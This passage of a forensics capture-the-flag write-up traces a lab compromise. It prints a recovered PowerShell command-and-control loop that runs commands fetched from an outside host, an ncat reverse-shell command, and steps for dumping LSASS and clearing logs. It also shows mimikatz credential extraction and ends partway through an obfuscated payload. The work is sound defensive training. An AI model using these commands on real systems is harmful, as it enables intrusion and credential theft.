AOQAwADAAMQAwAGYAOQBhADAAMwBkAGYAMQBiAGMANgAwAGMAZAA4ADEANAA5AGEAMwAyAGQAOQBlADcANwBkADEAYQBiADUANQA0ADIAZABhADQANwBmADAAYQA2ADYAMAAyADEANABmADAAMgAyAGEAMQAxAGQANgBjADgAOQA2ADYAYgA1AGQANQAwADIAMwBiADQANwAxADkAZgA5AGIANAA4AGQAYwAwADAANABiADIANgA2ADEAMwAwADIAYQA1ADIAOQA2ADgAOQBmADgANgAwAGUAYwAyAGUANwAyAGUANAA1AGEAZABhAGEAMgA5ADQAZQAxAGUAMgA0ADcAMQAzAGYANAAyADMAYQAzAGMAZgBlAGEANQA0ADQAYQBmADEAZAA1AGYANQBiADQANQA2ADgAZQBhAGYAZQA4ADYAYgBhADgAMgBjADAAZQBjADIAMQAyADQAMgAyADAANAA4ADAAMAAyAGIAMgBiAGQANwBjAGYAYQA3ADIAMABhAGMANgA1AGYAZgA4ADcAZQA2ADcANwA5AGQAMAA2AGEANgBlADkAZgA1AGIAOQA0AGEAMwBiADAANgA4ADMAZAAwADQANQBkAGIAYwBmAGEANwBiADkAMAA1ADgAMABiAGYAYgA1AGEAMgAxAGUAMQA0ADgANgAzADgAYQAwADcANQBlADUAYgA5AGUAYgAxADQANQA2AGQAYgAzADEAZgA0AGQAZQBiADMAZABlADIANQBiAGYANgA5AGUANQA5ADYAYgA4AGEAMgBjADcAYgA5ADUAOAAxAGMAZQAwADcAZAAzADQAMwA0ADIAMwA5ADMAYQAyADUAMQBkADUAYgBlADQANABmADgAMgBiADYAMgA3ADgAYgAxAGMAMQBhAGMANQAyAGQANgBlADcANAA1AGYANAA5ADMAMAA5ADcANwBkAGIAMwA0AGUAYQBjADEANwAwAGUAZQBhADEAZQAzADUAZAA0ADIAYQBjADAAMQA2ADYAOABlADQAMAAxADcANwA4AGUAZABjADgAZAA5AGIAZQA0ADcANgBmADAANwBiADgAOAA4ADIAYgA4AGIAYwA2ADgAZQA3ADgAYQA2AGQAMwAzAGMAZQBlAGUANQAzADIAZQBkAGMAYQBhADkANwBhAGEAOAAwADEAZgA0ADEAMwAxADAAYwA2AGEAZgBmAGMAZgBlADEAYQA5ADcAOAAxADEAOQAwADEAYwBkADIAOQAwAGYANgBhADkAYwBlAGQAYQBmADYAYwBmADYAOAA1ADMAMAAxADQANgA2ADUAZABhADMAYgAwADEAZQAwADgAMwAxADMAMgA5ADYAOQA1AGYANAAwADgAOABjAGYANABmAGEAMgAxADQAZQA3ADUAMgA2ADQAOABhAGMAYgBlADAAYgA2ADcAYwAyAGMAOQA0AGIAMwBlAGIANAAxADkAMwAyAGIAZQBhADMANQA4AGUAOQBkAGQANQA3AGUAYgAyADcAZABmADQAZQBiADQAOQBmADQAMAA5AGEAOABhADYAOABhAGIAZQBlADAAYQA2ADUAZgA3ADEANQBkADIANABiADcAYwAxAGIANQAwADgAZQBlAGUAMQBjAGEANAA1ADYAMgBiAGYAMwA4ADAAMwBiADIAZgAwADAAYQAxADEAOAAwADQAYgA3ADcAMwBhADEANABkAGQANQA1ADQAZgA1AGMAMAA5ADQAOQA0ADAAZgA3AGIAMwA3AGIAMwAxADAAZQBjADQAYQA3ADYAMQBkADQAOQA3AGEAOABiAGYAZgBhAGMAZQAyADAAMgA3ADIAOQAxADIAZgBhADQAYwBhADkAYwA4ADAANwA0ADUANwAyADgAZQAzADUAMQBlADIAMgA1ADYAMAAwADAAOAAyAGIAYQA4AGYAZQBiAGEAMAA3AGYAMgBjAGIANgBkAGMAZgAxAGIAYgA4ADEAMgA4ADAANQA3ADMANAA3ADcAOQA5AGUANQA2ADUAMQAwAGQANAA1AGYANQAyAGQAYwBiADUAZgAzADgAMABmADIANwAxAGMAZQBhAGYAOABiADUANQBiAGQAZgBkAGMAMABjAGIANwBjADAANAA5AGYAZABkADAAMgAwADAAYwA5ADcAYwA3ADQANwBkADQAYgAwAGYAZABkAGYAMwAzADUAZQAwADgAZAAyADIAYQA4ADQAOQBlADgAZgBjAGMAMgAzADcANAAyADcAZgBhADMAZgA4ADUAMgBhADAANQAxADkAYgAyAGQAYwBjADQAOQA1ADUANwAwADUAYgA0ADgAOQBkADEAYwAzADgAMAA3ADUAOAA5AGEAYQBiADYAZQA5ADEAYQAxADMAMgBkADYAZAA5ADYAMQAzAGQAZAA2AGYANQAyAGQANgA1ADIAMAA5ADUAYgA2AGEAZQBjADkAMQBhAGIANQAyADUAMwA5ADQAMAAyADUAOQA0ADgAZgBmADgANAAwADYAMwBmAGIAMAA4AGQAZgA0ADUAYwAyAGQAOQAwADYANgA5ADkAOABiAGYANAA1ADYAMQAyADUANQA1ADAAYwAzADUAYgAwAGQAMgA0ADUAZAA0AGUAYwAyAGYAMABkADAAOAA1ADgAYgA0ADcANAA1ADIAMAAwADIANwBlADYAYgA2ADUAOABlADMAYgA3ADYAYgBmAGQANQA2ADYAZAAyADYAYwA4ADcANQAzADcAOABjAGMAMQBlADQANABmAGUAOQBhADUAYQBlADkAZABkAGMANQA2ADAAMQBmADYAMAAxADEAOQA3AGIAYwBiAGUANwA2ADIAZAA4ADkAYQA4AGEAMgBlAGQAMgA4ADQANAA4ADcANAA4AGEAYgA0AGIAMgA5ADgAOQBhAGUAMQAzADUAMwBkADMAMAA5ADMANQA1ADMAMQAyADEAYQBhADkAOAA2ADgAOQBlAGEANwA2ADIANAA3ADgAOQAzAGEAYwA0ADkAYgBhAGMAMwBmAGQAZABiADYAZgA3ADAAZABkADIAMQA3ADAAYQA4ADQAOQBlADYANgAxADkAYQA3ADMAMgA0ADgAOQA2ADcAOQBkADEAYQBmAGYANwAzADcAYgA0ADAANgAzADgAZAA1AGYAZgBkADgAOQBjAGIAZgA4ADYAOAAwADcAOQBkADYAMAAxADYAMgBmADcANAAwAGUAOAA4ADYANQAzAGYAMwA5ADMAZQAxADYAMgBmADIAZABjAGEAMAA3ADIAMAA1AGQAYQA5AGYAOABkADMAZAA2AGYAMgAxAGQAYwA0ADAAMgAwADMANQA4AGUAYQBiADYAMQBlAGQAMAA3ADcAYQBlADgAOQBiADEANQA1ADQAZAA1ADgAMQA3ADQAMwBjAGYANQAxAGUAMQAyAGIAZQBjADIAYgBmADIAZgBlADUANAA3ADQAYQA5ADAANwBjADQANgA0AGEAYQAwADMAZAA0AGEAZQA1AGMAZgAzAGMAYgBlAGEAZQA2ADQAMABiADQAMQBhAGEAZQA5ADcAYwAxADAAZQBiADYAMQAyAGMANQAwADUAMQBiAGQAMQBkADUANAAwADQAZQA1AGMANQAzAGUAOAA3ADYAYwA3AGUANwBjADQAZgAzAGMANwAyADgANwA1ADQAOQBhADIAMwA1ADUAMgA2ADAANgA1ADYANwAwADcAMgBiAGUAYwA0ADYAOQA5ADQANgA5AGUAYgA0ADQAMQBjADUAYwA4AGQAMgBjAGIAYQAxADIAMwA3ADYAYQBlAGUAZgA0ADIANgBlAGMAZgA0AGIANQA3ADcAOAAyAGEAYwA2ADMAZQBiADcANgAxADgANABiADcAMgA5ADAAMgA2ADkAZgBlAGEANQBjADgAZgA4AGEAYwBjAGIAMgBkAGYANAA4AGQAOABmADkANgBjAGIAOQA4AGUAOQBjAGMAMwA3ADcAYwAyAGQAZQA2ADQAMwBkADYAMQA5AGIANwAyADYAZQA5ADcAYQA5ADQANQBkADEANgA0AGQANAA2AGQAZQBlADAAZgBlADUAMAAzADkAYwBlAGYAZgBhADQANwA1AGEAMQBkADMAOAA1ADkAMAA1AGIAMAAyADIAMQA1ADEAOQA2AGUAYgA0AGUAOAA1ADYAYgA4ADEAMAA1ADAAYQBlAGUAMgBlADYAYwBkAGEANQBiAGUANwAzADMAZAA1ADAAZgBjADYAMwA5AGEANABlADEAMABmADUAMwA2ADgANQBjADUAYgA5AGIAYQA3AGEAMwA1ADkANgBlADAAMgBiADYAZQA5AGEANgA0ADAAMAA0ADYAOABkAGMAMQAwADIAYwAzADgAOAAzAGIAMQBiADgAZgA1ADUAYQBmADIAZgBkAGMANAAzAGIANgA4AGUAOQBiADgANQBmADIAMAA5AGMAZAA1ADUAYgAyAGMAMwA4AGEAZABiADgAOAAwAGYANQBkADQAZgAzADkAYgA4AGYAOAA3ADIAYwAwAGUAMgAyADYAZgAzADUAOQAzADgANQA3ADYAYwAyADAANQBlADEANwBlADEAZgBjADQAOAAwAGUAZQAyADIANABhADUANwA4ADQAMwBiADIAZAA3ADYAYQBkADUANABhAGIAMwA1ADgANgA1AGYAYwAzAGEAYwA1ADAAMQA2ADgAZABlADMAYQA1AGEANwAxADQAMgBkAGQAZQA4AGMANwA5ADcAYgAzADUANwA3AGYAMgA5ADYAMgBlADcAOQA3AGUAYgBmAGUAMgBiAGIAMwA0ADkAOQAyADcAMwBlADgAZQBmADMAOAAxADUAMwA1ADcANABiADMAMABmADkAMgA3AGMAOAA5AGMANABlAGQAZQA3AGIAYQA2AGYANABkADAAMgBiADYAMgAyADQAZABlAGYANwBhADQAMAAxADMAYgBjADMAYwBjADkAZQBhADcANgBhADMAOAA0AGYAMwAwAGYAOQBmADUAOABlADgAZAAwADgANAAzADAANABlAGEAMwAyAGMAZAAzADgAYgA2ADUAMgBmAGQAMwBjADgANwBhADkAMwAxAGUAMABiADQAMwAzAGIAOAA1AGUAMwAzADEAYgBlAGMAMQBiAGYAYgBmAGIANAAzAGUANwBjAGMAMwAxADMAYwAwAGYAMQBlADAAZgBmAGEAOAAyADEANgA4ADgAMwA3ADMANgA5AGQAMgA2AGEAZAA1ADYAYwBmAGYANgAxADAAOAA3AGQAMwAyADYAMQBlADgAMgAzAGMAOAAxADkAMwBhADYANwA3ADcAYQA3ADMAYgAwAGMAMAA2AGEANwBiAGMAZABmADIAZQBjADUAYwAxADYAMABhAGUANQBlADAAZgA2ADMAOAA3ADEANgA0ADEAOAA1ADUAMgAzADUAYQA5ADMANQA0AGMAOABiADAAMgAwAGQAMgAyAGIANQBmADQAOQBhADQAYQAwADMAZAAxADkAMwAyADQAYgBkADUAMwAzADAANAAxADMAMwAxAGYANwAzADYAMgA1AGYAYwBhAGIAMQA2ADYANgBjAGQANgAwAGIANABkADYAOABhAGQAMQAzADEAMAA4AGYAYwBhAGUAOAA0ADYAYQAyAGMAOAA1AGUAMQA3ADgAOABiAGYANwBjAGMAZQAyADcAZgA1ADAAZQBiAGQAYQAwAGQAOAAyADQANABjADIAYQA4ADMAYQBkADIAOAAxAGUANgBiADMANABlADMAZABiADMAMQA1ADcANABjADEAZQBjAGUAZAAyAGIAMgA4ADEAYwBiADgAMgAwAGEAZgAzADUANgAyAGYAMwA3ADIANABmADkAOAA5ADcANwBiADUANQAzAGYAMgA=' | ConvERTtO - SecureSTRiNG - k 55, 113, 158, 254, 51, 94, 175, 13, 94, 42, 226, 159, 63, 7, 144, 195, 14, 139, 39, 217, 58, 39, 188, 60, 182, 192, 74, 94, 209, 172, 100, 93)).GetneTwoRKCrEDEnTIAl().pASsWoRD | .Out - String
$bwqvRnHz99 = (104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101);
$bwqvRnHz99 += (98, 105, 110, 46, 99, 111, 109, 47, 104, 86, 67, 69, 85, 75, 49, 66);
$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);
$s = '172.21.20.96:8080';
$i = 'eef8efac-321d465e-e9d053a7';
$p = 'http://';
$v = Invoke - WebRequest - UseBasicParsing - Uri $p$s / eef8efac - Heade
rs @ {
    "X-680d-47e8" = $i
};
while ($true) {
    $c = (Invoke - WebRequest - UseBasicParsing - Uri $p$s / 321 d465e - Headers @ {
        "X-680d-47e8" = $i
    }).Content;
    if ($c - ne 'None') {
        $r = iex $c -
            ErrorAction Stop - ErrorVariable e;
        $r = Out - String - InputObject $r;
        $t = Invoke - WebRequest - Uri $p$s / e9d053a7 - Method POST - Headers @ {
            "X-680d-47e8" = $i
        } - Body([System.T
            ext.Encoding
        ]::UTF8.GetBytes($e + $r) - join ' ')
    }
    sleep 0.8
}
```

The variable `flag` gets my attention so I just used the same code to see what is being constructed:  
```powershell
(base) PS C:\Users\user> $bwqvRnHz99 = (104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101);
$bwqvRnHz99 += (98, 105, 110, 46, 99, 111, 109, 47, 104, 86, 67, 69, 85, 75, 49, 66);
$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);

(base) PS C:\Users\user> $flag
https://pastebin.com/hVCEUK1B
```

Visiting this pastebin post, we get the first flag: `idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}`!

## Part 2 - Credential Access and PrivEsc
After having identified how the initial compromise happened, we can still keep looking at the powershell logs to see if we can spot any further malicious activity by the attacker there. The description of part 2 helps us again by giving out hints to search for leaked credentials:  
```
We suspect multiple accounts were compromised. The attacker moved laterally. Therefore, the credentials that he used to move laterally must have leaked. Let's analyze the sequence of actions taken by the attacker and tell us what he has obtained for later purposes?

Note: The flag is wrapped and divided into 2 parts
```
So maybe logs will hint out any command related to credentials for lateral movement.

After searching the logs, to sum up the activity found in the log, I gathered the following commands:
```
[+] http://172.21.20.96/windowsupdate.ps1
    [*] Initial Access
[+] "C:\Users\IEUser\AppData\Local\ Temp\SecurityUpdate.exe" 172.21.20.96 4444 -e cmd.exe
    [*] Ncat connection to execute commands like whoami
[+] arp -a
    [*] Gain network activity info
[+] ipconfig /all
    [*] Get network addresses
[+] REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
    [*] Enable WDigest authentication to force Windows to store plaintext credentials in LSASS memory. This prepares for dumping LSASS since it allows tools like mimikatz to extract creds from LSASS. So if the UseLogonCredential is set to 1, user credentials will be available in LSASS (meaning mimikatz # sekurlsa::logonpasswords will be able to dump creds).
[+] wevtutil cl Security
    [*] Used to clear the Security.evtx logs
[+] C:\Windows\System32\UpdateAgent.exe -accepteula -ma lsass.exe C:\Windows\System32\error
    [*] Dumbs the LSASS to the file named errordump.
[+] attrib -s -h DB79FF0C49C20D542F3690C933AC3046
    [*] Using the -s and -h flags, attrib makes the DPAPI file containing creds visible again for analysis/extraction/modification.
[+] C:\Windows\System32\mimikatz.exe
    [*] Runs mimikatz.
[+] C:\Windows\system32\net1  user netadmin S3cr3tpa5sw0rD /add
    [*] Uses net1 (duplicate of net.exe found in System32) to create a new user account with the specified creds in the command.
```

From the above commands executed and logged on the powershell logs (`Microsoft-Windows-Sysmon54Operational.evtx`) we can see clear indications of mimikatz usage both in the LSASS being dumped in the `errordump` file but also trying to decrypt credentials found in a possible DPAPI file named `DB79FF0C49C20D542F3690C933AC3046`. We can try to mimic what the attacker did since there is nothing else juicy here to look at. We will dump both files and try to use mimikatz to see what we can find. After all, mimikatz seems our best chance based on what the description states.

### [First half of the flag] Mimikatz - error.dmp file
Starting with the `error.dmp` file, we extract it from Autopsy and put it in the same directory as the `mimikatz.exe` tool - a popular tool used to extract credentials.  

```
C:\Users\user\mimikatz\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # sekurlsa::minidump error.dmp
Switch to MINIDUMP : 'error.dmp'

mimikatz # sekurlsa::logonPasswords full
Opening : 'error.dmp' file for minidump...

Authentication Id : 0 ; 284687 (00000000:0004580f)
Session           : Interactive from 1
User Name         : IEUser
Domain            : IEWIN7
Logon Server      : IEWIN7
Logon Time        : 1/7/2023 7:47:38 PM
SID               : S-1-5-21-1610009768-122519599-941061767-1000
        msv :
         [00010000] CredentialKeys
         * NTLM     : 022156166aa2ab0ce4de16a45098d745
         * SHA1     : ece4d499be6e18ebf42225da680e702abf639db3
         [00000003] Primary
         * Username : IEUser
         * Domain   : IEWIN7
         * NTLM     : 022156166aa2ab0ce4de16a45098d745
         * SHA1     : ece4d499be6e18ebf42225da680e702abf639db3
        tspkg :
        wdigest :
         * Username : IEUser
         * Domain   : IEWIN7
         * Password : idek{crEDentia
        kerberos :
         * Username : IEUser
         * Domain   : IEWIN7
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 95278 (00000000:0001742e)
```
And we spot the first part of the flag as the password of the user `IEUser` we saw multiple times being referenced in the logs: `idek{crEDentia`

### [Second half of the flag] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file
The other file we saw being manipulated before mimikatz was a file named DB79FF0C49C20D542F3690C933AC3046. We can spot strings like **Local Credential Data**. Searching online what this file is, we can find references to DPAPI. To decrypt these credentials, I followed this article after using `intext:"Local Credential Data Mimikatz"`:
- https://steemit.com/cmd/@evil0x00/mimikatz-get-local-credentials

Following the steps (and switching to the corresponding error.dmp file), we get the second part of the flag:
```
C:\Users\user\mimikatz\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {9fd81d55-a794-4a77-9fdc-38eff814d2be}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : d1ae596e635002339b7dcce09f5ff6acc53b7bc9395d162ea93c328f98c31f53
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 92e17a569f3c13606b0893c758fb9e81c1a06d2015dcebcf15107900a963ad0e
  dwDataLen          : 000000f0 - 240
  pbData             : 1413918e9f648cfb258ed6bd270360ab66d1d5e9c16580866a899184a71feb58219ade909f09184d6796ef0bd91e5091be80e76f48aa4cf7f29bfda7bb63d74e62698283cf2b6faf8ad44ddc296341acd8e61fe8cd12f2e33e8ae6bd20b328772b0816b881f21f877d8a1506fcbb06ce2b85688244b05911e97fa3f9068af0d17de3f6813cc937be00830986e93e2a467de46f11260746fe42ea38f6a20d79f1696de59efe69ead3bcb97a7ce85d45a6c78ec77bfe42b1a891175a519d37286ab3cf8a58955fdc5561f7543e6754953cce0576f58819433a47c930a31c9ad4dccf7376b1be3b00b7111ba649876b20d1
  dwSignLen          : 00000040 - 64
  pbSign             : 7f41a9469ad24a5e572c48ab6f0f1919f0a53e52963ad88676fb730aa9d6ba7e4045e5b3e45c9a33b56ca720c82d202cabd8085cabc5f3834e537ff79a987f22


mimikatz # sekurlsa::dpapi
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # sekurlsa::minidump error.dmp
Switch to MINIDUMP : 'error.dmp'

mimikatz # sekurlsa::dpapi
Opening : 'error.dmp' file for minidump...

Authentication Id : 0 ; 284687 (00000000:0004580f)
Session           : Interactive from 1
User Name         : IEUser
Domain            : IEWIN7
Logon Server      : IEWIN7
Logon Time        : 1/7/2023 7:47:38 PM
SID               : S-1-5-21-1610009768-122519599-941061767-1000
         [00000000]
         * GUID      :  {9fd81d55-a794-4a77-9fdc-38eff814d2be}
         * Time      :  1/7/2023 7:47:40 PM
         * MasterKey :  e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
         * sha1(key) :  de78dc1fb05d27eddaa81f4c2143d43a9a316f1e


Authentication Id : 0 ; 95278 (00000000:0001742e)
Session           : Service from 0
User Name         : sshd_server
Domain            : IEWIN7
Logon Server      : IEWIN7
Logon Time        : 1/7/2023 7:46:44 PM
SID               : S-1-5-21-1610009768-122519599-941061767-1002


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/7/2023 7:46:43 PM
SID               : S-1-5-19


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IEWIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/7/2023 7:46:43 PM
SID               : S-1-5-20


Authentication Id : 0 ; 44073 (00000000:0000ac29)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/7/2023 7:46:43 PM
SID               :


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IEWIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/7/2023 7:46:43 PM
SID               : S-1-5-18
         [00000000]
         * GUID      :  {79cd7db5-e519-453b-9dc9-ad52372a33d1}
         * Time      :  1/7/2023 7:46:56 PM
         * MasterKey :  50f4acc588c6f7aab0902c5e638c46b3671b150abf8d55e5a5ae47c50062607e3ec383b1973bae8d9d53815e59bfe012c594a232f2788562e461c9620ae74c31
         * sha1(key) :  913dba47ec0e0122494b963271da1c8a5757ef6c
         [00000001]
         * GUID      :  {f22e410f-f947-4e08-8f2a-8f65df603f8d}
         * Time      :  1/7/2023 7:46:43 PM
         * MasterKey :  19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa
         * sha1(key) :  b859b2b52e7e49cf5c70069745c88853c4b23487


mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046 /masterkey:e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {9fd81d55-a794-4a77-9fdc-38eff814d2be}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : d1ae596e635002339b7dcce09f5ff6acc53b7bc9395d162ea93c328f98c31f53
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 92e17a569f3c13606b0893c758fb9e81c1a06d2015dcebcf15107900a963ad0e
  dwDataLen          : 000000f0 - 240
  pbData             : 1413918e9f648cfb258ed6bd270360ab66d1d5e9c16580866a899184a71feb58219ade909f09184d6796ef0bd91e5091be80e76f48aa4cf7f29bfda7bb63d74e62698283cf2b6faf8ad44ddc296341acd8e61fe8cd12f2e33e8ae6bd20b328772b0816b881f21f877d8a1506fcbb06ce2b85688244b05911e97fa3f9068af0d17de3f6813cc937be00830986e93e2a467de46f11260746fe42ea38f6a20d79f1696de59efe69ead3bcb97a7ce85d45a6c78ec77bfe42b1a891175a519d37286ab3cf8a58955fdc5561f7543e6754953cce0576f58819433a47c930a31c9ad4dccf7376b1be3b00b7111ba649876b20d1
  dwSignLen          : 00000040 - 64
  pbSign             : 7f41a9469ad24a5e572c48ab6f0f1919f0a53e52963ad88676fb730aa9d6ba7e4045e5b3e45c9a33b56ca720c82d202cabd8085cabc5f3834e537ff79a987f22

Decrypting Credential:
 * volatile cache: GUID:{9fd81d55-a794-4a77-9fdc-38eff814d2be};KeyHash:de78dc1fb05d27eddaa81f4c2143d43a9a316f1e
 * masterkey     : e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000ea - 234
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 1/6/2023 3:55:10 PM
  unkFlagsOrSize : 00000040 - 64
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=TERMSRV/192.168.209.134
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : administrator
  CredentialBlob : l_4C3S5_f0R_1@73rAl_mOv3M3n7}
  Attributes     : 0
```
So the whole flag is: `idek{crEDential_4C3S5_f0R_1@73rAl_mOv3M3n7}`

## Part 3 - DNS Exfiltration and reconstruction
The description of the final part states:  
```
We tried to collect more network data for analysis, but because of the late approach, we only had data for a short period of time before we detected the attack and performed a shutdown of all machine at about 19:00 UTC. However I hope it can help you to answer the question whether the attacker has access to our important data?
```
The previous flag can be used as a hint on how to move on, since we still have a big .pcap we have not touched upon and I already felt a bit lost at this point.  

The flag from part 2 refers to `stealing credentials in order to do lateral movement`. We can also see that the second part of the flag was from a target domain with IP address `192.168.209.134`. Searching this IP address inside `Autopsy` as we previously did, we see logs related to RDP connection:  

![alt text](/posts/writeups/training/idek2022/autopsy4.png)  

So maybe the threat actor stole credentials for `192.168.209.134` and tried lateral moving into it through RDP...? Observing the traffic via wireshark we indeed see this IP and the related RDP traffic:  

![alt text](/posts/writeups/training/idek2022/wireshark_rdp.png)  

This was kind of a dead end since there was nothing else juicy in the logs to investigate and the rest of the traffic did not really look promising. It was then that I remembered a challenge I had played once, related to RDP and bitmaps. Searching for `RDP forensics` I gave a read to the following article and I got my hopes high again (since it also refers to lateral movement scenarios):  
- https://medium.com/@egycondor/rdp-bitmap-forensics-for-dfir-investigations-f4f627431275

Basically, when an RDP connection happens, RDP caches images of the screen of the connection for optimization. Maybe we can try to read the corresponding files the article suggests and get lucky? I shot my shot and navigated to `C:\Users\IEUser\AppData\Local\Microsoft\Terminal Server Client\Cache` where I extracted all the `.bin` files:

![alt text](/posts/writeups/training/idek2022/cachebitmaps.png)  

The article suggests using the `https://github.com/ANSSI-FR/bmc-tools.git` to extract all the bitmap images. Doing so, we will end up with the bitmap images, to which when put together, will finally lead us to the next clue on how to continue:  

![alt text](/posts/writeups/training/idek2022/bitmap1.png)  

![alt text](/posts/writeups/training/idek2022/bitmap2.png)  

(Images where taken from [here](https://www.cnblogs.com/WXjzc/p/17061485.html))

We can see a `Start-BitsTransfer` command is being used to transfer the file `https://gist.githubusercontent.com/bquanman/cb6a4b2420d9f3d2f27287dcb46661d6/raw/5c30ba3542b952e2be68491c825f0145ed0da14e/update.ps1` into another file in the Administrator account.  

Following this url, we get the update.ps1 script which is visibly obfuscated:
```powershell
 &( $EnV:COmsPEC[4,15,25]-JoiN'')( new-oBJeCt io.STREaMrEADEr(( new-oBJeCt io.cOMpreSsIoN.DeflaTestREAM( [IO.MEmoryStreAm] [sYStEm.ConVeRT]::FROMBase64stRiNG('rVtbrts4DN2KamQaBwamCyiCyT4Cr+TWWftYliyJ5DmU3PYnuJYliuLj8CHfOYT7Y37df4Xwfb7/c398hXD7+vn6tj1DWPa/58cWQhpc9r+e6eV2jHyecWSft6TREOLc29frvT3nk05Zk+jFRY807RP3KPPyrKUQfuzk9lnf3j/SLnrmTi9RS9vGt7c1HDTVzktDMc9c49s6rzJbeIy7HzNnyOZJ8iR4v739eVEutx+NYMqm5hiR6HN6Twc3021+fUUK0zuzE8Ja3+yrjjfTQSTtsS9cl/1tCPvK8+2ulEOH07n4v0RwXxVHpnXaqu6n6d85E0gbnOSjNgoFucHxfj02l+ztf76LAcm1h06md6J7sBHZyjJLz+WM0WD2wWwWWYKFibSJYDNL4Xx7mlIcPJa3gtnFmhhPLP2cohbijvFIS354JgkeP3ls3TKzS12QtskD8SFppQxFK02/S9L2OXQISKwre5cJZQkgzNZkq65TorF6a3ZpiGdxInPENEdwEufsci3bWjkeP3Flw1wWppLKTqeZUzcTxOUksV2cm45c2MMbfew+ikF+0kp6VrSr1ZjR7DFKf3nPymnUhqUWJxvDFEZVh8XhhRkrvoUQGxbN0ngWPTagFOAaq7UsTUSydPgrmibP0vpKPYriu4AFOmChlyyoOkV6Po7raKVqsxr4LNcB06ykVmJDiq1sjVBrTEBVjh/rNs2APrj2m/Q+8XSOxdMgS0rbAfErH+uanRWKEoGCNOhCxRjsKDacAzJHfVpblHb0LDcNoWIPMJREC4m3fKybQb8ja4CSJ2cC6G9QeTEKh0cm4rH7Hux0tZFY1HFQTNPal4ANSUNf0oY0KwfUbknAXellzCuw8TMlKlEIRAUerVyunFPglDA9Ykat+3EzSvRbEy0jIIngqNWKJVldtcKaiAH5blocdU0GX8mYyXekHucNRGmdBQoLhKat/Kq1bl/PJA1ZNVJ8GG7zLFCbhPF7mU42iZM7AB1LxD3la97+ZnfOjkwY